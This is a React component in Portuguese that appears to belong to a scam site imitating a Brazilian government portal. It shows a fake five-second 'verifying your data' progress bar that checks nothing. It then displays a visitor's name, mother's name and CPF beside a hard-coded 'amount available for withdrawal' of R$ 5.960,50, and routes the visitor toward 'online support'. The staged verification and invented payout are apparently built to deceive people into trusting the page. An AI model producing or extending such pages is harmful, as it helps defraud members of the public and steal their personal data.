import React, { useState, useEffect } from 'react';
import { CheckCircle2 } from 'lucide-react';

interface UserData {
  nome: string;
  mae: string;
  cpf: string;
}

interface UserDataConfirmationProps {
  userData: UserData;
  onConfirm: () => void;
}

const UserDataConfirmation: React.FC<UserDataConfirmationProps> = ({ userData, onConfirm }) => {
  const [loading, setLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [showData, setShowData] = useState(false);

  useEffect(() => {
    const duration = 5000; // 5 seconds
    const interval = 50; // Update every 50ms
    const steps = duration / interval;
    const increment = 100 / steps;
    
    let currentProgress = 0;
    const timer = setInterval(() => {
      currentProgress += increment;
      setProgress(Math.min(currentProgress, 100));
      
      if (currentProgress >= 100) {
        clearInterval(timer);
        setLoading(false);
        setShowData(true);
      }
    }, interval);

    return () => clearInterval(timer);
  }, []);

  const handleConfirmClick = () => {
    onConfirm();
    setTimeout(() => {
      const supportElement = document.querySelector('[data-testid="online-support"]');
      if (supportElement) {
        supportElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    }, 100);
  };

  return (
    <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-md mx-auto">
      {loading ? (
        <div className="space-y-4">
          <h2 className="text-xl font-bold text-[#1351B4] text-center mb-6">
            Verificando seus dados
          </h2>
          <div className="w-full bg-gray-200 rounded-full h-4">
            <div 
              className="bg-[#1351B4] h-4 rounded-full transition-all duration-300 ease-out"
              style={{ width: `${progress}%` }}
            />
          </div>
          <p className="text-center text-sm text-gray-600">
            Por favor, aguarde enquanto verificamos seus dados...
          </p>
        </div>
      ) : (
        <>
          <div className="flex items-center justify-center mb-6">
            <CheckCircle2 size={40} className="text-green-600" />
          </div>
          
          <h2 className="text-2xl font-bold text-[#1351B4] mb-6 text-center">
            Confirme seus dados
          </h2>
          
          <div className="space-y-4 mb-6">
            <div className="border-b pb-3">
              <p className="text-sm text-gray-600">Nome completo</p>
              <p className="text-lg font-medium text-gray-900">{userData.nome}</p>
            </div>
            
            <div className="border-b pb-3">
              <p className="text-sm text-gray-600">Nome da mãe</p>
              <p className="text-lg font-medium text-gray-900">{userData.mae}</p>
            </div>
            
            <div className="border-b pb-3">
              <p className="text-sm text-gray-600">CPF</p>
              <p className="text-lg font-medium text-gray-900">{userData.cpf}</p>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <p className="text-sm text-gray-600">Valor disponível para saque</p>
              <p className="text-2xl font-bold text-green-600">R$ 5.960,50</p>
            </div>
          </div>
          
          <div className="space-y-3">
            <button
              onClick={handleConfirmClick}
              className="w-full bg-[#1351B4] text-white py-2 px-4 rounded-md hover:bg-[#0b3d8a] transition-colors duration-300 font-medium"
            >
              Confirmar e Prosseguir
            </button>
            
            <p className="text-center text-sm text-gray-600">
              Verifique se os dados estão corretos antes de prosseguir
            </p>
          </div>
        </>
      )}
    </div>
  );
};

export default UserDataConfirmation;